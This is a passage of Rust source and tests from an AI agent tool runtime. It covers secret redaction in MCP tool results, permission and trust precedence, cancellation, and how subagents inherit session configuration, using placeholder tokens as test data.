        assert_eq!(fixture.log().matches("tools/call").count(), 1);
    }

    #[test]
    fn structured_only_content_is_visible_and_scanned() {
        let fixture = Fixture::new();
        let out = fixture.call("structured", &PermissionScope::default());
        assert_eq!(out["ok"], true);
        assert!(out["result"].as_str().unwrap().contains("42"));
        assert!(!out.to_string().contains("abcdefghijklmnopqrstuvwxyz"));
        assert!(
            !out.to_string()
                .contains("AbCDef1234567890gHiJKLmN7890xyzPQ")
        );
        assert!(out["redactions"].as_u64().unwrap() >= 3);
        assert_eq!(fixture.status(), "ok");
    }

    #[test]
    fn advertised_server_and_tool_arguments_are_preserved() {
        let fixture = Fixture::new();
        let args = json!({"server":"destination","tool":"operation","other":42});
        let out = fixture.call_with_args("echo", args.clone(), &PermissionScope::default());
        assert_eq!(out["ok"], true, "{out}");
        let returned: Value = serde_json::from_str(out["result"].as_str().unwrap()).unwrap();
        assert_eq!(returned, args);
    }

    #[test]
    fn complete_result_is_scanned_before_encoded_truncation() {
        let fixture = Fixture::new();
        let out = fixture.call("large", &PermissionScope::default());
        assert_eq!(out["ok"], true, "{out}");
        assert_eq!(out["truncated"], true);
        assert!(
            out["redactions"].as_u64().unwrap() >= 3,
            "late token must be scanned too"
        );
        assert!(!out.to_string().contains("abcdefghijklmnopqrstuvwxyz"));
        assert!(out.to_string().len() <= MAX_RESULT_BYTES);
        assert!(out["result"].as_str().unwrap().contains('é'));
    }

    #[test]
    fn dense_secret_payload_is_scanned_in_bounded_time() {
        let secret = "ghp_abcdefghijklmnopqrstuvwxyz123456";
        let mut result = json!({"content":[{"type":"text","text":format!("ghp_short {}", format!("{secret} ").repeat(20000))}]});
        let started = Instant::now();
        let mut redactions = 0;
        scan_mcp_value(&mut result, &mut redactions);
        assert!(started.elapsed() < Duration::from_secs(3));
        assert!(redactions >= 20000);
        assert!(!result.to_string().contains(secret));
        let output = bounded_mcp_output(
            json!({"ok":true,"result":mcp_result_text(&result),"redactions":redactions}),
            "result",
        );
        assert!(output.len() <= MAX_RESULT_BYTES);
        assert!(!output.contains(secret));
    }

    #[test]
    fn huge_structured_key_and_many_leaves_do_not_amplify_scanning() {
        let key = "k".repeat(500000);
        let mut result = json!({(key): vec!["v"; 100000]});
        assert!(result.to_string().len() <= orbit_mcp::MAX_FRAME_BYTES);
        let started = Instant::now();
        let mut redactions = 0;
        scan_mcp_value(&mut result, &mut redactions);
        assert!(started.elapsed() < Duration::from_secs(3));
        assert_eq!(redactions, 0);
    }

    #[test]
    fn protocol_and_config_errors_are_scanned() {
        let fixture = Fixture::new();
        let out = fixture.call("server_error", &PermissionScope::default());
        assert_eq!(out["ok"], false);
        assert!(!out.to_string().contains("abcdefghijklmnopqrstuvwxyz"));
        assert!(
            !out.to_string()
                .contains("AbCDef1234567890gHiJKLmN7890xyzPQ")
        );
        assert!(out["redactions"].as_u64().unwrap() >= 4);
        let invalid_name = "ghp_abcdefghijklmnopqrstuvwxyz123456";
        std::fs::write(
            fixture.home.join("mcp.json"),
            json!({"servers":{(invalid_name):{"command":"", "timeout_ms":0}}}).to_string(),
        )
        .unwrap();
        let out = fixture.call("action", &PermissionScope::default());
        assert_eq!(out["ok"], false);
        assert!(!out.to_string().contains("abcdefghijklmnopqrstuvwxyz"));
        assert!(out["redactions"].as_u64().unwrap() >= 1);
        assert_eq!(fixture.log().matches("spawn").count(), 1);
    }

    #[test]
    fn disabled_hidden_and_profile_excluded_names_never_spawn() {
        for extra in [
            json!({"enabled":false}),
            json!({"tools":[]}),
            json!({"tools":["structured"]}),
        ] {
            let fixture = Fixture::new();
            fixture.config(extra);
            let out = fixture.call("invented", &PermissionScope::default());
            assert_eq!(out["ok"], false);
            assert!(fixture.log().is_empty());
        }
        let fixture = Fixture::new();
        fixture
            .cx
            .set_ext(McpToolSelection(vec![fixture.wire("structured")]));
        let out = fixture.call("invented", &PermissionScope::default());
        assert_eq!(out["ok"], false);
        assert!(fixture.log().is_empty());
    }

    #[test]
    fn discovery_selects_profiles_and_config_before_spawning() {
        let fixture = Fixture::new();
        let read_only = vec!["Read".into()];
        let defs = crate::tools::session_tool_definitions_with_context(
            &fixture.home,
            &fixture.cx,
            Some(&read_only),
        );
        assert!(!defs.iter().any(|tool| tool.name.starts_with("mcp__")));
        assert!(fixture.log().is_empty());
        fixture.config(json!({"tools":["structured"]}));
        let hidden = vec![fixture.wire("action")];
        let defs = crate::tools::session_tool_definitions_with_context(
            &fixture.home,
            &fixture.cx,
            Some(&hidden),
        );
        assert!(!defs.iter().any(|tool| tool.name.starts_with("mcp__")));
        assert!(fixture.log().is_empty());
        let selected = vec![fixture.wire("structured")];
        let defs = crate::tools::session_tool_definitions_with_context(
            &fixture.home,
            &fixture.cx,
            Some(&selected),
        );
        assert_eq!(
            defs.iter()
                .filter(|tool| tool.name.starts_with("mcp__"))
                .map(|tool| tool.name.clone())
                .collect::<Vec<_>>(),
            selected
        );
        assert_eq!(fixture.log().matches("spawn").count(), 1);
        assert_eq!(
            fixture.call("structured", &PermissionScope::default())["ok"],
            true
        );
        assert_eq!(
            fixture.log().matches("spawn").count(),
            1,
            "discovery session must be reused"
        );
    }

    #[test]
    fn nested_profile_cannot_widen_parent_selection() {
        let fixture = Fixture::new();
        let allowed = fixture.wire("structured");
        fixture.cx.set_ext(McpToolSelection(vec![allowed.clone()]));
        let child = child_agent_context(&fixture.home, "mcp-owner", "child", &fixture.cx);
        set_mcp_tool_selection(&child, &fixture.cx, &[]);
        assert_eq!(
            child.ext::<McpToolSelection>().unwrap().0,
            vec![allowed.clone()]
        );
        let wider = vec![allowed.clone(), fixture.wire("action")];
        assert_eq!(
            effective_mcp_tool_selection(&child, Some(&wider)),
            Some(vec![allowed.clone()])
        );
        let excluded = vec![fixture.wire("action")];
        assert_eq!(
            effective_mcp_tool_selection(&child, Some(&excluded)),
            Some(vec![])
        );
        assert_eq!(
            fixture.cx.ext::<McpToolSelection>().unwrap().0,
            vec![allowed]
        );
    }

    #[test]
    fn plan_and_operator_deny_outrank_durable_and_auto_grants() {
        let fixture = Fixture::new();
        std::fs::write(
            fixture.home.join("permissions.toml"),
            format!("[allow]\ntools = [\"{}\"]\n", fixture.wire("action")),
        )
        .unwrap();
        let scopes = [
            PermissionScope::from_flags(Some("plan"), Some(&fixture.wire("action")), None),
            PermissionScope::from_flags(None, None, Some(&fixture.wire("action"))),
            PermissionScope::from_flags(None, Some("Read"), None),
        ];
        for scope in scopes {
            let out = fixture.call("action", &scope);
            assert_eq!(out["denied"], true, "{out}");
            assert_eq!(fixture.status(), "denied");
        }
        assert!(fixture.log().is_empty());
        let allowed =
            PermissionScope::from_flags(Some("dontAsk"), Some(&fixture.wire("action")), None);
        assert_eq!(fixture.call("action", &allowed)["ok"], true);
    }

    #[test]
    fn actual_context_cwd_selects_trusted_project_configuration() {
        let fixture = Fixture::new();
        std::fs::remove_file(fixture.home.join("mcp.json")).unwrap();
        std::fs::create_dir_all(fixture.work.join(".orbit")).unwrap();
        std::fs::write(
            fixture.work.join(".orbit/mcp.json"),
            fixture.config_value(json!({})).to_string(),
        )
        .unwrap();
        assert_eq!(
            fixture.call("action", &PermissionScope::default())["ok"],
            false
        );
        assert!(fixture.log().is_empty());
        orbit_tools::permissions::FolderTrust::new(fixture.home.clone())
            .trust(&fixture.work)
            .unwrap();
        let out = fixture.call("action", &PermissionScope::default());
        assert_eq!(out["ok"], true, "{out}");
        assert_eq!(out["result"], fixture.work.to_string_lossy().as_ref());
    }

    #[test]
    fn trusted_context_project_deny_outranks_auto_and_durable_allow() {
        let fixture = Fixture::new();
        std::fs::create_dir_all(fixture.work.join(".orbit")).unwrap();
        std::fs::write(
            fixture.work.join(".orbit/settings.local.toml"),
            format!("[permissions]\ndeny = [\"{}\"]\n", fixture.wire("action")),
        )
        .unwrap();
        std::fs::write(
            fixture.home.join("permissions.toml"),
            format!("[allow]\ntools = [\"{}\"]\n", fixture.wire("action")),
        )
        .unwrap();
        orbit_tools::permissions::FolderTrust::new(fixture.home.clone())
            .trust(&fixture.work)
            .unwrap();
        let out = fixture.call("action", &PermissionScope::default());
        assert_eq!(out["denied"], true, "{out}");
        assert_eq!(fixture.status(), "denied");
        assert!(fixture.log().is_empty());
    }

    #[test]
    fn dispatch_forwards_cancellation_and_does_not_replay() {
        let fixture = Fixture::new();
        let cancel = Arc::new(AtomicBool::new(false));
        let check = cancel.clone();
        fixture
            .cx
            .push_cancel_check(Arc::new(move || check.load(Ordering::SeqCst)));
        let log = fixture.home.join("calls.log");
        let watcher = std::thread::spawn(move || {
            let deadline = Instant::now() + Duration::from_secs(2);
            while Instant::now() < deadline {
                if std::fs::read_to_string(&log)
                    .unwrap_or_default()
                    .contains("tools/call")
                {
                    cancel.store(true, Ordering::SeqCst);
                    return;
                }
                std::thread::sleep(Duration::from_millis(5));
            }
        });
        let started = Instant::now();
        let out = fixture.call("silent", &PermissionScope::default());
        watcher.join().unwrap();
        assert_eq!(out["ok"], false);
        assert!(
            out["error"].as_str().unwrap().contains("cancelled"),
            "{out}"
        );
        assert!(started.elapsed() < Duration::from_secs(2));
        assert_eq!(fixture.log().matches("tools/call").count(), 1);
        fixture.cx.pop_cancel_check();
        assert_eq!(
            fixture.call("action", &PermissionScope::default())["ok"],
            true
        );
        assert_eq!(fixture.log().matches("spawn").count(), 2);
        assert_eq!(fixture.log().matches("tools/call").count(), 2);
    }

    #[test]
    fn precancelled_call_does_not_spawn_and_timeout_is_bounded() {
        let fixture = Fixture::new();
        fixture.cx.push_cancel_check(Arc::new(|| true));
        assert_eq!(
            fixture.call("action", &PermissionScope::default())["ok"],
            false
        );
        assert!(fixture.log().is_empty());
        fixture.cx.pop_cancel_check();
        fixture.config(json!({"timeout_ms":150, "initialize_timeout_ms":100}));
        let started = Instant::now();
        let out = fixture.call("silent", &PermissionScope::default());
        assert_eq!(out["ok"], false);
        assert!(started.elapsed() < Duration::from_secs(2));
        assert_eq!(fixture.status(), "error");
    }
}

/// The subagent's tool executor: every call goes through execute_call
/// — the same permission path, ledger and approval channel as the
/// parent session (roadmap gate 5: the subagent's approval request
/// appears in the main session).
pub struct SubagentExecutor<'a> {
    home: std::path::PathBuf,
    session_id: String,
    approval: &'a mut dyn ApprovalChannel,
    grants: AutoGrants,
    /// The subagent inherits the parent session's permission scope
    /// (S5): same mode, same operator lists.
    pub scope: PermissionScope,
    /// The subagent's own tool context (B2): read-before-edit state
    /// shared across its calls, separate from the parent's.
    tool_cx: orbit_tools::ToolContext,
}

impl<'a> SubagentExecutor<'a> {
    /// The subagent's id: also the session id of its ledger records, so
    /// what a front-end shows can be matched to the chain.
    #[allow(dead_code)] // retained for callers of the legacy constructor
    pub fn id(&self) -> &str {
        &self.session_id
    }

    #[allow(dead_code)] // retained for callers without a session context
    pub fn new(home: std::path::PathBuf, approval: &'a mut dyn ApprovalChannel) -> Self {
        let session_id = format!("subagent-{}", ulid::Ulid::new());
        let working_dir =
            std::env::current_dir().unwrap_or_else(|_| std::path::Path::new(".").to_path_buf());
        let tool_cx = orbit_tools::ToolContext::new(home.clone(), session_id.clone(), working_dir);
        Self {
            session_id,
            home,
            approval,
            grants: AutoGrants::new(),
            scope: PermissionScope::default(),
            tool_cx,
        }
    }

    pub(crate) fn with_context(
        home: std::path::PathBuf,
        session_id: String,
        tool_cx: orbit_tools::ToolContext,
        scope: PermissionScope,
        approval: &'a mut dyn ApprovalChannel,
    ) -> Self {
        Self {
            home,
            session_id,
            approval,
            grants: AutoGrants::new(),
            scope,
            tool_cx,
        }
    }
}

/// Trusted runtime identity, never taken from tool arguments or a caller's
/// arbitrary ToolContext.session_id. Children keep the root owner namespace.
#[derive(Clone)]
struct AgentSessionContext {
    owner_session_id: String,
    current_agent_id: Option<String>,
    depth: usize,
}

fn agent_session_context(cx: &orbit_tools::ToolContext, session_id: &str) -> AgentSessionContext {
    cx.ext::<AgentSessionContext>()
        .map(|context| (*context).clone())
        .unwrap_or_else(|| AgentSessionContext {
            owner_session_id: session_id.into(),
            current_agent_id: None,
            depth: 0,
        })
}

pub(crate) fn agent_store_for_context(
    home: &Path,
    session_id: &str,
    cx: &orbit_tools::ToolContext,
) -> Result<orbit_engine::agent_store::AgentStore, String> {
    orbit_engine::agent_store::AgentStore::new(
        home,
        &agent_session_context(cx, session_id).owner_session_id,
    )
}

pub(crate) fn agent_parent_and_depth(
    cx: &orbit_tools::ToolContext,
    session_id: &str,
) -> Result<Option<String>, String> {
    let identity = agent_session_context(cx, session_id);
    if identity.depth >= 3 {
        return Err("agent nesting limit of 3 reached".into());
    }
    Ok(identity.current_agent_id)
}

pub(crate) fn child_agent_context(
    home: &Path,
    session_id: &str,
    agent_id: &str,
    parent: &orbit_tools::ToolContext,
) -> orbit_tools::ToolContext {
    let identity = agent_session_context(parent, session_id);
    // Clone would share extensions, cancellation and read-before-edit state.
    // Constructing a fresh context preserves authority without sharing grants.
    let mut child =
        orbit_tools::ToolContext::new(home.into(), agent_id.into(), parent.working_dir.clone());
    child.working_dirs = parent.working_dirs.clone();
    child.set_ext(AgentSessionContext {
        owner_session_id: identity.owner_session_id,
        current_agent_id: Some(agent_id.into()),
        depth: identity.depth + 1,
    });
    if let Some(observer) = parent.ext::<SubagentObserver>() {
        child.set_ext((*observer).clone());
    }
    crate::plugin_content::inherit_context(parent, &child);
    child
}

pub(crate) fn invocation_context(
    parent: &orbit_tools::ToolContext,
    session_id: &str,
) -> orbit_tools::ToolContext {
    let mut invocation = orbit_tools::ToolContext::new(
        parent.home.clone(),
        parent.session_id.clone(),
        parent.working_dir.clone(),
    );
    invocation.working_dirs = parent.working_dirs.clone();
    invocation.set_ext(agent_session_context(parent, session_id));
    crate::plugin_content::inherit_context(parent, &invocation);
    if let Some(cancel) = parent.cancel_check() {
        invocation.push_cancel_check(cancel);
    }
    if let Some(observer) = parent.ext::<SubagentObserver>() {
        invocation.set_ext((*observer).clone());
    }
    invocation
}

impl orbit_engine::ToolExecutor for SubagentExecutor<'_> {
    fn begin_turn(&mut self, config: &orbit_engine::TurnConfig) {
        remember_turn_config(&self.tool_cx, config);
    }

    fn execute(
        &mut self,
        calls: &[crate::PendingToolCall],
        _round: u32,
    ) -> Vec<orbit_engine::ToolRoundResult> {
        let cx = self.tool_cx.clone();
        run_until_cancelled(
            &cx,
            calls,
            |call| {
                let decision_id = ulid::Ulid::new().to_string();
                let (content, _) = execute_call(
                    &self.home,
                    &self.session_id,
                    &decision_id,
                    call,
                    false,
                    true,
                    self.approval,
                    &mut self.grants,
                    &self.scope,
                    &self.tool_cx,
                )
                .unwrap_or_else(|e| (tool_error(&e), None));
                orbit_engine::ToolRoundResult {
                    call_id: call.id.clone(),
                    content,
                }
            },
            |_| {},
        )
    }

    fn begin_cancel_scope(&mut self, token: &orbit_provider_http::CancelToken) {
        begin_cancel_scope(&self.tool_cx, token);
    }

    fn end_cancel_scope(&mut self) {
        self.tool_cx.pop_cancel_check();
    }
}

/// The provider configuration of the turn a session is running (gateway,
/// model, credential, pricing), kept on the session's tool context. A
/// subagent runs on THIS, not on whatever the environment names.
pub struct SessionTurnConfig(pub orbit_engine::TurnConfig);

#[derive(Clone)]
pub struct SessionEffortSetting(pub Option<orbit_adapter::types::EffortSetting>);

/// Selection provenance is independent from the resolved provider request value.
pub fn remember_effort_setting(
    cx: &orbit_tools::ToolContext,
    setting: &Option<orbit_adapter::types::EffortSetting>,
) {
    cx.set_ext(SessionEffortSetting(setting.clone()));
}

/// Keep the running turn's provider configuration where its tools can
/// reach it. Every front-end's executor does this when the engine starts a
/// turn (`ToolExecutor::begin_turn`).
pub fn remember_turn_config(cx: &orbit_tools::ToolContext, config: &orbit_engine::TurnConfig) {
    cx.set_ext(SessionTurnConfig(config.clone()));
}

/// What a subagent is doing, for a front-end that shows it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SubagentUpdate {
    Started {
        id: String,
        name: String,
        model: String,
        task: String,
    },
    /// The subagent started a tool call (or a new round): what it is doing.
    Progress { id: String, action: String },
    /// Its turn ended: `ok` is whether it completed, `report` its final
    /// words (or the error that stopped it).
    Finished {
        id: String,
        ok: bool,
        report: String,
    },
}

/// Where a front-end wants subagent updates; attached to its tool context
/// with `set_ext`.
#[derive(Clone)]
pub struct SubagentObserver(pub std::sync::Arc<dyn Fn(&SubagentUpdate) + Send + Sync>);

/// The configuration a subagent runs on: the SESSION's (same gateway,
/// model, credential and pricing as the turn that called it), without
/// sampling overrides (E8: subagents inherit none). Only a context that
/// was never told (a test, a bare executor) falls back to the environment.
pub(crate) fn session_subagent_config(
    cx: &orbit_tools::ToolContext,
    home: &Path,
) -> orbit_engine::TurnConfig {
    match cx.ext::<SessionTurnConfig>() {
        Some(session) => {
            let mut config = session.0.clone();
            config.sampling = None;
            config
        }
        None => subagent_turn_config(home),
    }
}

/// The configuration THIS subagent runs on. Task-based routing
/// (roadmap §Providers): the agent's own `model:` frontmatter wins,
/// then the explore role for the read-only Explore/Plan agents, then
/// the subagent role, then the session's own model. Caches and thinking
/// belong to one model, so the MAIN conversation never switches — only
/// the delegated task does.
fn subagent_config_for(
    cx: &orbit_tools::ToolContext,
    home: &Path,
    agent: &str,
    profile_model: Option<&str>,
) -> Result<orbit_engine::TurnConfig, String> {
    let base = session_subagent_config(cx, home);

    // Look the agent up for its own model override. Unknown names keep
    // the role path (execute_task will report the unknown agent).
    let agent_model = profile_model.filter(|model| !model.trim().is_empty());

    if let Some(spec) = agent_model {
        // An agent-declared model resolves like a role spec: bare id
        // across providers, provider/model explicit.
        let cfg = crate::config::ProvidersConfig::load(home)?;
        let selected = crate::phase_routing::resolve_model(&cfg, spec, None)
            .map_err(|e| format!("configured agent profile model: {e}"))?;
        let mut out = selected.turn_config(None)?;
        out.sampling = None; // E8: subagents inherit no sampling.
        return Ok(out);
    }

    // Read-only explorers prefer the cheap role; everything else the
    // subagent role. Unset/unresolvable roles fall back to the session.
    let role = if agent == "Explore" || agent == "Plan" {
        "explore"
    } else {
        "subagent"
    };
    let mut out = crate::try_role_turn_config(home, &base, role)?;
    out.sampling = None; // E8: subagents inherit no sampling
    Ok(out)
}

/// Explicit selections must resolve to configured models. Persisted selections
/// may reuse an ephemeral parent's exact provider/model after a reload.
pub(crate) fn task_config_for(
    cx: &orbit_tools::ToolContext,
    home: &Path,
    agent: &str,
    explicit: Option<&str>,
    saved: Option<&str>,
    profile_model: Option<&str>,
) -> Result<orbit_engine::TurnConfig, String> {
    // Malformed capability declarations must not silently become an unconfigured model.
    crate::config::ProvidersConfig::load(home)?;
    let Some(spec) = explicit.or(saved) else {
        return subagent_config_for(cx, home, agent, profile_model);
    };
    let base = session_subagent_config(cx, home);
    let configured = crate::config::ProvidersConfig::load(home)
        .map_err(|e| format!("load configured agent model: {e}"))?;
    if let Ok(selected) = crate::phase_routing::resolve_model(&configured, spec, None) {
        let mut out = selected.turn_config(None)?;
        out.sampling = None;
        return Ok(out);
    }
    if configured.provider.is_empty()
        && explicit.is_none()
        && spec == format!("{}/{}", base.provider_id, base.model)
    {
        return Ok(base);
    }
    Err(format!("unknown configured agent model: {spec}"))
}

/// Derive a TurnConfig for a subagent from the environment alone
/// (ORBIT_GATE_URL, ORBIT_MODEL, …). Only the fallback: a session's own
/// configuration (`SessionTurnConfig`) is what a subagent normally runs on.
pub fn subagent_turn_config(_home: &Path) -> orbit_engine::TurnConfig {
    // No implicit local service receives a credential when configuration is absent.
    // An empty endpoint is rejected by the ordinary dispatch validation before IO.
    let gate = std::env::var("ORBIT_GATE_URL").unwrap_or_default();
    let model = std::env::var("ORBIT_MODEL").unwrap_or_else(|_| "default".into());
    orbit_engine::dispatch::TurnConfig {
        provider_id: std::env::var("ORBIT_PROVIDER").unwrap_or_else(|_| "local".into()),
        gate,
        model,
        sampling: None, // E8: subagents inherit no sampling
        effort: None,
        supported_efforts: None,
        first_byte_timeout_ms: None,
        idle_timeout_ms: None,
        kind: orbit_engine::dispatch::ProviderKind::OpenAiCompatible,
        credential_env: std::env::var("ORBIT_CREDENTIAL_ENV")
            .ok()
            .or_else(crate::legacy_gate_credential_env),
        pricing: None,
        max_output_tokens: 0,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_call(name: &str, args: &[u8]) -> crate::PendingToolCall {
        crate::PendingToolCall {
            index: 0,
            id: "call-1".into(),
            name: name.into(),
            arguments: args.to_vec(),
        }
    }

    fn test_home(name: &str) -> std::path::PathBuf {
        let home = std::env::temp_dir().join(format!("orbit-tool-runtime-{name}"));
        let _ = std::fs::remove_dir_all(&home);
        std::fs::create_dir_all(&home).unwrap();
        home
    }

    /// A session context for tests: same shape the executors build.
    /// The working dir is the given path (file tools resolve relative
    /// paths against it).
    fn test_cx(work_dir: &std::path::Path) -> orbit_tools::ToolContext {
        orbit_tools::ToolContext::new(
            work_dir.to_path_buf(),
            "test-session".into(),
            work_dir.to_path_buf(),
        )
    }

    /// The ledger's single-writer flock (E0719) is contention, not a
    /// wedge: two Read results appending at once must both land, the
    /// second waiting out the first. This is the load-bearing fix that
    /// makes parallel read-only calls safe — without it the loser's
    /// result record is dropped and the chain is short a record.
    #[test]
    fn concurrent_result_appends_do_not_drop_records() {
        let home = test_home("ledger-contention");
        let cx = test_cx(&home.join("work"));
        std::fs::create_dir_all(home.join("work")).unwrap();
        let calls: Vec<crate::PendingToolCall> = (0..4)
            .map(|i| crate::PendingToolCall {
                index: i,
                id: format!("call-{i}"),
                name: "Read".into(),
                arguments: br#"{}"#.to_vec(),
            })
            .collect();
        // Run four execute_calls concurrently: each opens the writer
        // for intent, drops it, reopens for the result. The retry in
        // reopen_writer is what lets them all succeed.
        let home_c = home.clone();
        let calls_c = calls.clone();
        std::thread::scope(|s| {
            for call in &calls_c {
                let home = home_c.clone();
                let cx = cx.clone();
                s.spawn(move || {
                    let mut ch = StdApprovalChannel::new(false);
                    let mut grants = AutoGrants::new();
                    let _ = execute_call(
                        &home,
                        "sess",
                        &format!("d-{}", call.id),
                        call,
                        false,
                        true,
                        &mut ch,
                        &mut grants,
                        &PermissionScope::default(),
                        &cx,
                    );
                });
            }
        });
        // Every call wrote an intent, a verdict and a result — and a
        // lone-writer race dropped none of them. Decode the kinds so
        // the assertion says what actually happened, not a magic total.
        let ledger_dir = home.join("ledger");
        let (recs, _) = orbit_ledger::reader::verify_ledger(&ledger_dir).expect("ledger verifies");
        use orbit_ledger::event::LedgerEvent::*;
        let mut kinds: std::collections::HashMap<&str, usize> = std::collections::HashMap::new();
        for r in &recs {
            let k = match &r.record.event {
                ToolIntent(_) => "intent",
                ToolVerdict(_) => "verdict",
                ToolResult(_) => "result",
                _ => "other",
            };
            *kinds.entry(k).or_default() += 1;
        }
        let call_id_count = |prefix: &str| {
            recs.iter()
                .filter(|r| match &r.record.event {
                    ToolIntent(e) => e.call_id.starts_with(prefix),
                    ToolVerdict(e) => e.call_id.starts_with(prefix),
                    ToolResult(e) => e.call_id.starts_with(prefix),
                    _ => false,
                })
                .count()
        };
        for i in 0..4 {
            let prefix = format!("call-{i}");
            assert_eq!(
                call_id_count(&prefix),
                3,
                "{prefix}: intent + verdict + result, all present"
            );
        }
        assert_eq!(kinds.get("intent"), Some(&4), "one intent per call");
        assert_eq!(kinds.get("verdict"), Some(&4), "one verdict per call");
        assert_eq!(kinds.get("result"), Some(&4), "one result per call");
    }

    fn session_config(model: &str) -> orbit_engine::TurnConfig {
        orbit_engine::TurnConfig {
            provider_id: "mine".into(),
            gate: "https://gateway.example:8443/v1".into(),
            model: model.into(),
            kind: orbit_engine::ProviderKind::Anthropic,
            credential_env: Some("MY_KEY".into()),
            pricing: None,
            max_output_tokens: 4096,
            sampling: Some((Some(0.2), None)),
            effort: None,
            supported_efforts: None,
            first_byte_timeout_ms: None,
            idle_timeout_ms: None,
        }
    }

    /// A subagent runs on the SESSION's provider, model and credential; it
    /// used to read ORBIT_GATE_URL / ORBIT_MODEL, which only `-p` exports, and
    /// otherwise fall back to a hard-coded gateway and model.
    #[test]
    fn a_subagent_inherits_the_sessions_provider() {
        let cx = test_cx(&test_home("sub-inherit"));
        remember_turn_config(&cx, &session_config("m1"));
        let c = session_subagent_config(&cx, std::path::Path::new("/h"));
        assert_eq!(c.gate, "https://gateway.example:8443/v1");
        assert_eq!(c.model, "m1");
        assert_eq!(c.provider_id, "mine");
        assert_eq!(c.credential_env.as_deref(), Some("MY_KEY"));
        assert_eq!(c.kind, orbit_engine::ProviderKind::Anthropic);
        assert_eq!(c.max_output_tokens, 4096);
        // E8: sampling overrides are the session's, not the subagent's.
        assert!(c.sampling.is_none());
        // The next turn (after /model) is what the next subagent runs on.
        remember_turn_config(&cx, &session_config("m2"));
        assert_eq!(
            session_subagent_config(&cx, std::path::Path::new("/h")).model,
            "m2"
        );
    }

    /// Only a context nobody told (a test, a bare executor) reads the
    /// environment.
    #[test]
    fn a_bare_context_falls_back_to_the_environment() {
        let cx = test_cx(&test_home("sub-bare"));
        let c = session_subagent_config(&cx, std::path::Path::new("/h"));
        assert_eq!(
            c.gate,
            subagent_turn_config(std::path::Path::new("/h")).gate
        );
        assert_eq!(
            c.model,
            std::env::var("ORBIT_MODEL").unwrap_or_else(|_| "default".into())
        );
    }

    /// A channel that always returns the given verdict (for tests).
    struct FixedChannel(ApprovalVerdict);
    impl ApprovalChannel for FixedChannel {
        fn ask(&mut self, _req: &ApprovalRequest, _auto: bool) -> ApprovalVerdict {
            self.0
        }
    }

    /// The proof surface hears every record as it lands, in order, with the
    /// record's own hash — so what the Activity panel shows can be checked
    /// against the chain. (The sink was declared, never wired.)
    #[test]
    fn every_ledger_record_is_announced_in_order_with_its_hash() {
        let home = test_home("announce");
        let call = make_call("calculator", br#"{"expression":"2*(3+4)"}"#);
        let cx = test_cx(&home.join("work"));
        let heard =
            std::sync::Arc::new(std::sync::Mutex::new(Vec::<orbit_tools::LedgerNote>::new()));
        let sink = heard.clone();
        cx.set_ledger_sink(Some(std::sync::Arc::new(
            move |n: &orbit_tools::LedgerNote| {
                sink.lock().unwrap().push(n.clone());
            },
        )));
        let mut ch = FixedChannel(ApprovalVerdict::Deny); // auto-tools: not asked
        execute_call(
            &home,
            "s1",
            "d1",
            &call,
            true,
            false,
            &mut ch,
            &mut AutoGrants::new(),
            &PermissionScope::default(),
            &cx,
        )
        .unwrap();
        let heard = heard.lock().unwrap();
        let kinds: Vec<&str> = heard.iter().map(|n| n.kind).collect();
        assert_eq!(kinds, ["intent", "verdict", "result"]);
        assert!(heard[1].fact.starts_with("allowed — "), "{}", heard[1].fact);
        assert_eq!(heard[2].fact, "ok");
        assert!(heard.iter().all(|n| n.target.starts_with("calculator")));
        // The digests ARE the chain: each is a real record's hash and the
        // last is the ledger's head.
        let (records, head) = orbit_ledger::verify_ledger(&home.join("ledger")).unwrap();
        for n in heard.iter() {
            assert!(
                records.iter().any(|r| r.self_hash == n.digest),
                "{} is not in the ledger",
                n.digest
            );
        }
        assert_eq!(heard.last().unwrap().digest, head);
    }

    #[test]
    fn auto_tools_executes_and_records_digest_only() {
        let home = test_home("auto");
        let call = make_call("calculator", br#"{"expression":"2*(3+4)"}"#);
        let mut ch = FixedChannel(ApprovalVerdict::Deny); // shouldn't be asked
        let mut grants = AutoGrants::new();
        let (out, _) = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            true,
            false,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&home.join("work")),
        )
        .unwrap();
        assert!(out.contains("14"));
        let mut ledger = String::new();
        for e in std::fs::read_dir(home.join("ledger/segments"))
            .unwrap()
            .flatten()
        {
            let bytes = std::fs::read(e.path()).unwrap_or_default();
            ledger.push_str(&String::from_utf8_lossy(&bytes));
        }
        assert!(ledger.contains("tool_intent"));
        assert!(ledger.contains("tool_verdict"));
        assert!(ledger.contains("tool_result"));
        assert!(ledger.contains("arguments_sha256"));
        assert!(
            !ledger.contains("2*(3+4)"),
            "raw arguments must not enter ledger"
        );
        assert!(
            !ledger.contains("\"result\":14"),
            "raw output must not enter ledger"
        );
    }

    #[test]
    fn non_tty_denies_write_without_allow_path() {
        // B4: headless denies an ask-class tool with a visible reason;
        // read-only tools run (that is the fix, not a regression).
        let home = test_home("deny");
        let dir = home.join("work");
        std::fs::create_dir_all(&dir).unwrap();
        let call = make_call("Write", br#"{"file_path":"out.txt","content":"x"}"#);
        let mut ch = StdApprovalChannel::new(false); // non-interactive
        let mut grants = AutoGrants::new();
        let (out, _) = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            false,
            false,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&dir),
        )
        .unwrap();
        assert!(
            out.contains("non-interactive"),
            "headless ask must deny with the visible reason: {out}"
        );
        assert!(!dir.join("out.txt").exists());
    }

    #[test]
    fn unknown_tool_is_denied_even_with_auto_tools() {
        let home = test_home("unknown");
        let call = make_call("shell", br#"{"cmd":"id"}"#);
        let mut ch = FixedChannel(ApprovalVerdict::AllowOnce);
        let mut grants = AutoGrants::new();
        let (out, _) = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            true,
            false,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&home.join("work")),
        )
        .unwrap();
        assert!(out.contains("unknown tool"));
    }

    #[test]
    fn allow_once_executes() {
        let home = test_home("allow-once");
        let call = make_call("calculator", br#"{"expression":"3+4"}"#);
        let mut ch = FixedChannel(ApprovalVerdict::AllowOnce);
        let mut grants = AutoGrants::new();
        let (out, _) = execute_call(
            &home,
            "s1",
            "d1",
            &call,
            false,
            true,
            &mut ch,
            &mut grants,
            &PermissionScope::default(),
            &test_cx(&home.join("work")),
        )
        .unwrap();
        assert!(out.contains("7"));
    }

    #[test]
    fn deny_does_not_execute() {
        let home = test_home("deny-manual");
        let dir = home.join("work");
